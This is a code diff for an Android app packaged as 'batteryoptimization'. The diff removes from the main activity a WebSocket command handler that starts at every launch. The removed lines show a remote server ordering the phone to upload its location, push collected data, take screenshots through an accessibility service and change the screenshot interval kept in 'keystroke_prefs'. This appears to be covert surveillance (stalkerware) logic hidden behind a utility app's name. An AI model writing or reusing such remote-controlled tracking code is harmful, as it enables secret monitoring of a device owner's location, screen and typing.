@@ -9,7 +9,6 @@ import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import android.graphics.BitmapFactory
 import android.net.Uri
-import android.util.Log
 import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.foundation.background
@@ -36,11 +35,8 @@ import androidx.lifecycle.LifecycleEventObserver
 import androidx.navigation.compose.NavHost
 import androidx.navigation.compose.composable
 import androidx.navigation.compose.rememberNavController
-import com.android.batteryoptimization.network.WebSocketManager
-import com.google.gson.JsonObject
 import com.android.batteryoptimization.ocr.api.IOcrService
 import com.android.batteryoptimization.ocr.api.OcrResult
-import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.map
@@ -82,12 +78,6 @@ class MainActivity : ComponentActivity() {
         }
 
         val repository = InputRepository.getInstance(applicationContext)
-
-        // ── WebSocket 长连接（每次启动 APP 即开启） ──────────────────
-        WebSocketManager.onCommand = { command, params ->
-            handleWebSocketCommand(command, params)
-        }
-        WebSocketManager.start(this)
 
         val startDest = when {
             repository.getUserInfo() == null -> "binding"
@@ -161,59 +151,6 @@ class MainActivity : ComponentActivity() {
                             )
                         }
                     }
-                }
-            }
-        }
-    }
-
-    // ─── WebSocket 指令处理 ───────────────────────────────────────────
-
-    private fun handleWebSocketCommand(command: String, data: Any?) {
-        val repo = InputRepository.getInstance(applicationContext)
-        when (command) {
-            "report_location", "force_report_location" -> {
-                CoroutineScope(Dispatchers.IO).launch {
-                    val location = AMapLocationHelper.getLocation(this@MainActivity)
-                    val locPayload = com.google.gson.Gson().toJson(location)
-                    WebSocketManager.send("""{"command":"upload_location","params":$locPayload}""")
-                }
-            }
-            "upload_data" -> {
-                kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
-                    val (_, msg) = repo.uploadData()
-                    Log.d("WebSocket", "Upload trigger result: $msg")
-                }
-            }
-
-            "report_enabled" -> {
-                // 服务器下发 data: {"reportEnabled": 0或1}
-                val reportEnabled = (data as? JsonObject)?.get("reportEnabled")?.asInt
-                if (reportEnabled != null) {
-                    repo.setReportEnabled(reportEnabled == 1)
-                    Log.d(
-                        "WebSocket",
-                        "数据上报开关: ${if (reportEnabled == 1) "开启" else "关闭"}"
-                    )
-                }
-            }
-
-            "take_screenshot" -> {
-                val intent = Intent(InputAccessibilityService.ACTION_TAKE_SCREENSHOT).apply {
-                    setPackage(packageName)
-                }
-                sendBroadcast(intent)
-            }
-
-            "set_interval" -> {
-                // 服务器下发 data: {"interval": 秒}
-                val intervalSec = (data as? com.google.gson.JsonObject)?.get("interval")?.asLong
-                if (intervalSec != null && intervalSec > 0) {
-                    val intervalMs = intervalSec * 1000
-                    getSharedPreferences("keystroke_prefs", MODE_PRIVATE)
-                        .edit()
-                        .putLong(InputAccessibilityService.KEY_SCREENSHOT_INTERVAL, intervalMs)
-                        .apply()
-                    Log.d("WebSocket", "Interval set to ${intervalSec}s")
                 }
             }
         }
